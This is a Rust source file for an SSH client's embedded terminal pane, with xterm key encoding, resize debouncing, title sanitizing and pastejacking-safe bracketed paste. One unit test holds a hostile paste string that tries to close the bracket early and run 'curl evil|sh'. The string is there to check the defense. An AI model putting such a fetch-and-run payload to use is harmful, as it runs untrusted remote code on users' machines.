//! Embedded terminal model: one [`TerminalView`] per pane (see
//! [`crate::app_panes`]).
//!
//! The `alacritty_terminal::Term` (grid + scrollback + VT state) is shared
//! with a reader task that parses PTY output off the UI loop. The UI is woken
//! through a coalesced `dirty` flag: a flood of output produces one redraw
//! per frame, never an unbounded queue of actions. Because the reader only
//! pulls from the engine's bounded channel as fast as it parses, SSH
//! backpressure is preserved end to end.

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex, PoisonError};
use std::time::{Duration, Instant};

use alacritty_terminal::event::{Event as TermEvent, EventListener};
use alacritty_terminal::grid::{Dimensions, Scroll};
use alacritty_terminal::term::{Config, Osc52, Term, TermMode};
use alacritty_terminal::vte::ansi::Processor;
use bytes::Bytes;
use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
use portico_core::engine::{PtySize, TerminalHandle, TerminalInputs};
use portico_core::ids::{SessionId, TerminalId};
use tokio::sync::mpsc;

use crate::action::Action;

/// Lines of scrollback kept per terminal.
const SCROLLBACK: usize = 10_000;
/// A new size reaches the remote PTY once the geometry has been still this
/// long (a burst of pane resizes sends one `window-change`).
pub(crate) const RESIZE_DEBOUNCE: Duration = Duration::from_millis(50);

/// Grid size in cells.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) struct GridSize {
    pub(crate) cols: u16,
    pub(crate) rows: u16,
}

impl GridSize {
    pub(crate) fn pty(self) -> PtySize {
        PtySize {
            cols: self.cols,
            rows: self.rows,
            pixel_width: 0,
            pixel_height: 0,
        }
    }
}

impl Dimensions for GridSize {
    fn total_lines(&self) -> usize {
        usize::from(self.rows)
    }
    fn screen_lines(&self) -> usize {
        usize::from(self.rows)
    }
    fn columns(&self) -> usize {
        usize::from(self.cols)
    }
}

/// Receives terminal-side events (title changes, replies to queries).
#[derive(Clone)]
pub(crate) struct EventProxy {
    input: TerminalInputs,
    title: Arc<Mutex<Option<String>>>,
}

impl EventListener for EventProxy {
    fn send_event(&self, event: TermEvent) {
        match event {
            // Device status / attribute reports must reach the remote program.
            TermEvent::PtyWrite(text) => {
                // Non-blocking on purpose: this runs under the Term lock.
                let _ = self.input.try_send(Bytes::from(text));
            }
            TermEvent::Title(title) => {
                *self.title.lock().unwrap_or_else(PoisonError::into_inner) =
                    Some(sanitize_title(&title));
            }
            TermEvent::ResetTitle => {
                *self.title.lock().unwrap_or_else(PoisonError::into_inner) = None;
            }
            // OSC 52 is disabled in the config; bell and others are ignored.
            _ => {}
        }
    }
}

pub(crate) type SharedTerm = Arc<Mutex<Term<EventProxy>>>;

/// How a terminal's remote side ended.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum Ended {
    /// The shell exited with this status.
    Exited(u32),
    /// Killed by this signal (`TERM`, `KILL`…).
    Killed(String),
    /// The channel or the connection closed.
    Closed,
}

/// A terminal tab.
pub(crate) struct TerminalView {
    pub(crate) id: TerminalId,
    pub(crate) session: SessionId,
    pub(crate) alias: String,
    pub(crate) term: SharedTerm,
    title: Arc<Mutex<Option<String>>>,
    input: TerminalInputs,
    pub(crate) size: GridSize,
    /// The grid already has `size`; the PTY gets it at this instant plus
    /// [`RESIZE_DEBOUNCE`] (see [`Self::flush_resize`]).
    resize_since: Option<Instant>,
    pub(crate) dirty: Arc<AtomicBool>,
    /// Why the remote shell ended, once it did.
    pub(crate) ended: Option<Ended>,
    pub(crate) closed: bool,
}

impl std::fmt::Debug for TerminalView {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("TerminalView")
            .field("id", &self.id)
            .field("alias", &self.alias)
            .field("size", &self.size)
            .finish_non_exhaustive()
    }
}

impl TerminalView {
    /// Wraps an engine terminal and starts its reader task.
    pub(crate) fn spawn(
        handle: TerminalHandle,
        alias: String,
        size: GridSize,
        actions: mpsc::UnboundedSender<Action>,
    ) -> Self {
        let TerminalHandle {
            id,
            session,
            input,
            mut output,
        } = handle;
        let title = Arc::new(Mutex::new(None));
        let proxy = EventProxy {
            input: input.clone(),
            title: Arc::clone(&title),
        };
        let config = Config {
            scrolling_history: SCROLLBACK,
            // No clipboard access from remote programs.
            osc52: Osc52::Disabled,
            ..Config::default()
        };
        let term: SharedTerm = Arc::new(Mutex::new(Term::new(config, &size, proxy)));
        let dirty = Arc::new(AtomicBool::new(false));

        let (reader_term, reader_dirty) = (Arc::clone(&term), Arc::clone(&dirty));
        tokio::spawn(async move {
            let mut parser: Processor = Processor::new();
            while let Some(bytes) = output.recv().await {
                {
                    let mut term = reader_term.lock().unwrap_or_else(PoisonError::into_inner);
                    parser.advance(&mut *term, &bytes);
                }
                // Coalesce: only one pending redraw per frame.
                if !reader_dirty.swap(true, Ordering::AcqRel) {
                    let _ = actions.send(Action::TerminalDirty(id));
                }
            }
            let _ = actions.send(Action::TerminalDirty(id));
        });

        Self {
            id,
            session,
            alias,
            term,
            title,
            input,
            size,
            resize_since: None,
            dirty,
            ended: None,
            closed: false,
        }
    }

    /// Title set by the remote (OSC 0/2), if any. Shown next to the alias,
    /// never instead of it: a remote title must not impersonate another host.
    pub(crate) fn remote_title(&self) -> Option<String> {
        let title = self.title.lock().unwrap_or_else(PoisonError::into_inner);
        title
            .as_deref()
            .map(str::trim)
            .filter(|t| !t.is_empty())
            .map(str::to_owned)
    }

    pub(crate) fn mode(&self) -> TermMode {
        *self
            .term
            .lock()
            .unwrap_or_else(PoisonError::into_inner)
            .mode()
    }

    pub(crate) fn send(&self, bytes: Vec<u8>) {
        // Back to the live view on input, like every terminal.
        self.scroll(Scroll::Bottom);
        let _ = self.input.try_send(Bytes::from(bytes));
    }

    pub(crate) fn scroll(&self, scroll: Scroll) {
        self.term
            .lock()
            .unwrap_or_else(PoisonError::into_inner)
            .scroll_display(scroll);
    }

    /// The local grid follows `size` at once (drawing stays exact); the
    /// remote PTY follows after [`RESIZE_DEBOUNCE`] of stillness.
    pub(crate) fn resize(&mut self, size: GridSize) {
        if size == self.size || size.cols == 0 || size.rows == 0 {
            return;
        }
        self.size = size;
        self.term
            .lock()
            .unwrap_or_else(PoisonError::into_inner)
            .resize(size);
        self.resize_since = Some(Instant::now());
    }

    /// A size is waiting for the PTY.
    pub(crate) fn resize_pending(&self) -> bool {
        self.resize_since.is_some()
    }

    /// Sends the pending size once the geometry has been still long enough.
    pub(crate) fn flush_resize(&mut self, now: Instant) {
        if self
            .resize_since
            .is_some_and(|since| now.saturating_duration_since(since) >= RESIZE_DEBOUNCE)
        {
            self.resize_since = None;
            // A `watch` under the hood: the latest size can never be lost.
            self.input.resize(self.size.pty());
        }
    }

    pub(crate) fn paste(&self, text: &str) {
        let bracketed = self.mode().contains(TermMode::BRACKETED_PASTE);
        self.send(encode_paste(text, bracketed));
    }

    pub(crate) fn close(&mut self) {
        self.input.close();
        self.closed = true;
    }
}

impl Drop for TerminalView {
    fn drop(&mut self) {
        // A tab that disappears must never leave its shell running.
        self.input.close();
    }
}

/// Longest remote title kept (titles are re-rendered every frame).
const MAX_TITLE: usize = 256;

/// Removes bidi overrides (spoofing) and caps the length.
fn sanitize_title(title: &str) -> String {
    title
        .chars()
        .filter(|c| {
            !matches!(c, '\u{202a}'..='\u{202e}' | '\u{2066}'..='\u{2069}') && !c.is_control()
        })
        .take(MAX_TITLE)
        .collect()
}

/// Bytes sent for a paste. In bracketed mode every ESC / C1 introducer is
/// removed so pasted text can never close the bracket early (no
/// pastejacking); otherwise newlines become carriage returns.
pub(crate) fn encode_paste(text: &str, bracketed: bool) -> Vec<u8> {
    if bracketed {
        let clean: String = text
            .chars()
            .filter(|&c| c != '\x1b' && c != '\u{9b}')
            .collect();
        let mut out = Vec::with_capacity(clean.len() + 12);
        out.extend_from_slice(b"\x1b[200~");
        out.extend_from_slice(clean.as_bytes());
        out.extend_from_slice(b"\x1b[201~");
        out
    } else {
        text.replace("\r\n", "\r").replace('\n', "\r").into_bytes()
    }
}

/// Encodes a key press the way xterm does. `None` for keys with no byte form.
pub(crate) fn encode_key(
    key: KeyEvent,
    mode: alacritty_terminal::term::TermMode,
) -> Option<Vec<u8>> {
    use alacritty_terminal::term::TermMode;
    let app_cursor = mode.contains(TermMode::APP_CURSOR);
    let ctrl = key.modifiers.contains(KeyModifiers::CONTROL);
    let alt = key.modifiers.contains(KeyModifiers::ALT);
    let shift = key.modifiers.contains(KeyModifiers::SHIFT);
    // xterm modifier parameter: 1 + shift + 2·alt + 4·ctrl.
    let modifier = 1 + u8::from(shift) + 2 * u8::from(alt) + 4 * u8::from(ctrl);

    let csi_final = |c: char| -> Vec<u8> {
        if modifier > 1 {
            format!("\x1b[1;{modifier}{c}").into_bytes()
        } else if app_cursor {
            format!("\x1bO{c}").into_bytes()
        } else {
            format!("\x1b[{c}").into_bytes()
        }
    };
    let tilde = |n: u8| -> Vec<u8> {
        if modifier > 1 {
            format!("\x1b[{n};{modifier}~").into_bytes()
        } else {
            format!("\x1b[{n}~").into_bytes()
        }
    };

    let mut bytes = match key.code {
        KeyCode::Char(c) if ctrl => {
            let b = match c {
                'a'..='z' => u8::try_from(c).ok()? - b'a' + 1,
                'A'..='Z' => u8::try_from(c).ok()? - b'A' + 1,
                ' ' | '@' | '2' => 0,
                '[' | '3' => 0x1b,
                '\\' | '4' => 0x1c,
                ']' | '5' => 0x1d,
                '^' | '6' => 0x1e,
                '_' | '-' | '7' => 0x1f,
                '?' | '8' => 0x7f,
                _ => return None,
            };
            vec![b]
        }
        KeyCode::Char(c) => c.to_string().into_bytes(),
        // LNM (new line mode): Enter sends CR LF.
        KeyCode::Enter if mode.contains(TermMode::LINE_FEED_NEW_LINE) => b"\r\n".to_vec(),
        KeyCode::Enter => vec![b'\r'],
        KeyCode::Tab => vec![b'\t'],
        KeyCode::BackTab if modifier > 2 => format!("\x1b[1;{modifier}Z").into_bytes(),
        KeyCode::BackTab => b"\x1b[Z".to_vec(),
        KeyCode::Backspace => vec![if ctrl { 0x08 } else { 0x7f }],
        KeyCode::Esc => vec![0x1b],
        KeyCode::Up => csi_final('A'),
        KeyCode::Down => csi_final('B'),
        KeyCode::Right => csi_final('C'),
        KeyCode::Left => csi_final('D'),
        KeyCode::Home => csi_final('H'),
        KeyCode::End => csi_final('F'),
        KeyCode::Insert => tilde(2),
        KeyCode::Delete => tilde(3),
        KeyCode::PageUp => tilde(5),
        KeyCode::PageDown => tilde(6),
        KeyCode::F(n @ 1..=4) => {
            let c = char::from(b'P' + (n - 1));
            if modifier > 1 {
                format!("\x1b[1;{modifier}{c}").into_bytes()
            } else {
                format!("\x1bO{c}").into_bytes()
            }
        }
        KeyCode::F(n @ 5..=12) => {
            let code = [15, 17, 18, 19, 20, 21, 23, 24];
            tilde(*code.get(usize::from(n - 5))?)
        }
        _ => return None,
    };
    // Alt as an ESC prefix, for plain characters and control bytes.
    if alt
        && matches!(
            key.code,
            KeyCode::Char(_) | KeyCode::Backspace | KeyCode::Enter | KeyCode::Tab | KeyCode::Esc
        )
    {
        bytes.insert(0, 0x1b);
    }
    Some(bytes)
}

#[cfg(test)]
mod tests {
    use super::*;

    use alacritty_terminal::term::TermMode;

    fn k(code: KeyCode, m: KeyModifiers) -> Option<Vec<u8>> {
        encode_key(KeyEvent::new(code, m), TermMode::empty())
    }

    #[test]
    #[allow(clippy::naive_bytecount)] // tiny buffer, test only
    fn bracketed_paste_cannot_escape() {
        let out = encode_paste("\x1b[20\x1b[201~1~curl evil|sh\r", true);
        assert!(out.ends_with(b"\x1b[201~"));
        let escapes = out.iter().filter(|&&b| b == 0x1b).count();
        assert_eq!(escapes, 2, "only the bracket markers");
        assert_eq!(encode_paste("a\nb", false), b"a\rb");
    }

    #[test]
    fn titles_are_sanitized_and_capped() {
        let long = format!("\u{202e}{}", "x".repeat(10_000));
        let t = sanitize_title(&long);
        assert_eq!(t.chars().count(), MAX_TITLE);
        assert!(!t.contains('\u{202e}'));
    }

    #[test]
    fn printable_and_control() {
        assert_eq!(
            k(KeyCode::Char('é'), KeyModifiers::NONE),
            Some("é".as_bytes().to_vec())
        );
        assert_eq!(k(KeyCode::Char('c'), KeyModifiers::CONTROL), Some(vec![3]));
        assert_eq!(k(KeyCode::Char(' '), KeyModifiers::CONTROL), Some(vec![0]));
        assert_eq!(
            k(KeyCode::Char('x'), KeyModifiers::ALT),
            Some(b"\x1bx".to_vec())
        );
        assert_eq!(k(KeyCode::Enter, KeyModifiers::NONE), Some(b"\r".to_vec()));
        assert_eq!(k(KeyCode::Backspace, KeyModifiers::NONE), Some(vec![0x7f]));
    }

    #[test]
    fn cursor_keys_follow_decckm_and_modifiers() {
        assert_eq!(k(KeyCode::Up, KeyModifiers::NONE), Some(b"\x1b[A".to_vec()));
        assert_eq!(
            encode_key(
                KeyEvent::new(KeyCode::Up, KeyModifiers::NONE),
                TermMode::APP_CURSOR
            ),
            Some(b"\x1bOA".to_vec())
        );
        assert_eq!(
            encode_key(
                KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE),
                TermMode::LINE_FEED_NEW_LINE
            ),
            Some(b"\r\n".to_vec())
        );
        assert_eq!(k(KeyCode::Tab, KeyModifiers::ALT), Some(b"\x1b\t".to_vec()));
        assert_eq!(
            k(KeyCode::Esc, KeyModifiers::ALT),
            Some(b"\x1b\x1b".to_vec())
        );
        assert_eq!(
            k(KeyCode::Right, KeyModifiers::CONTROL),
            Some(b"\x1b[1;5C".to_vec())
        );
        assert_eq!(
            k(KeyCode::Delete, KeyModifiers::NONE),
            Some(b"\x1b[3~".to_vec())
        );
        assert_eq!(
            k(KeyCode::F(1), KeyModifiers::NONE),
            Some(b"\x1bOP".to_vec())
        );
        assert_eq!(
            k(KeyCode::F(12), KeyModifiers::SHIFT),
            Some(b"\x1b[24;2~".to_vec())
        );
    }
}
